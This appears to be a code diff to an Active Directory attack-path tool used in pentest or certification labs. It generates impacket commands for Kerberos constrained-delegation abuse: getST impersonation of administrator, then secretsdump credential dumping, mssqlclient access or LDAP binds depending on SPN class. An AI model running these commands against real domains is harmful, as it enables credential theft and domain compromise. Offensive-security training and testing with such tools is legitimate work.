@@ -760,6 +760,38 @@ def run(report, store, ui=None):
             _spn_summary = ", ".join(spns[:3])
             if len(spns) > 3:
                 _spn_summary += f" (+{len(spns) - 3} more)"
+            # iter-89: the follow-up tool depends on SPN service class.
+            # cifs/host SPN -> secretsdump / psexec (SMB is the standard).
+            # mssqlsvc SPN  -> impacket-mssqlclient (SMB via secretsdump WON'T
+            #                  auth to MSSQL - operator wastes a command).
+            # http SPN      -> only usable via web tooling, not exam-legal
+            #                  general-purpose. Downgrade note.
+            # ldap SPN      -> ldapsearch bind for RID walking / dcsync
+            #                  (still needs full DCSync rights).
+            _spn_class = _spn_parts[0].lower() if _spn_parts else ""
+            _followup = []
+            if _spn_class in ("cifs", "host", "restrictedkrbhost"):
+                _followup = [
+                    f"impacket-secretsdump -k -no-pass -dc-ip {_dc_c} "
+                    f"'{_dom_c}/administrator@{_spn_host}'"
+                ]
+            elif _spn_class == "mssqlsvc":
+                _followup = [
+                    f"impacket-mssqlclient -k -no-pass -dc-ip {_dc_c} "
+                    f"'{_dom_c}/administrator@{_spn_host}'   "
+                    f"# -windows-auth via Kerberos ticket",
+                ]
+            elif _spn_class == "ldap":
+                _followup = [
+                    f"# LDAP SPN - test bind (need DCSync rights for domain hashes):",
+                    f"ldapsearch -Y GSSAPI -H 'ldap://{_spn_host}' "
+                    f"-b 'DC={_dom_c.replace('.', ',DC=')}' 'objectClass=user' sAMAccountName",
+                ]
+            else:
+                _followup = [
+                    f"# {_spn_class}/... SPN - service-specific auth needed; "
+                    f"use ticket against {_spn_host}",
+                ]
             chains.append(Chain("R-CONSTRAINED", "constrained delegation",
                 f"{ulc} has AllowedToDelegateTo: {_spn_summary}",
                 crit=8, conf=0.9, ready=1.4, prox=0.95,           # score 9.58
@@ -771,12 +803,7 @@ def run(report, store, ui=None):
                     f"impacket-getST -spn '{first_spn}' -impersonate administrator "
                     f"-dc-ip {_dc_c} '{_dom_c}/{ulc}:{pw}'",
                     f"export KRB5CCNAME=administrator.ccache",
-                    # iter-67: -dc-ip anchor here too - the -k -no-pass
-                    # secretsdump still needs KDC discovery for ticket
-                    # validation; without it lab boxes without a working
-                    # DNS SRV lookup fail with "Kerberos SessionError".
-                    f"impacket-secretsdump -k -no-pass -dc-ip {_dc_c} "
-                    f"'{_dom_c}/administrator@{_spn_host}'",
+                    *_followup,
                 ], src=best_src, line=best_line))
 
     # iter-45: R-ADMIN-CRED - the operator's owned plaintext cred matches
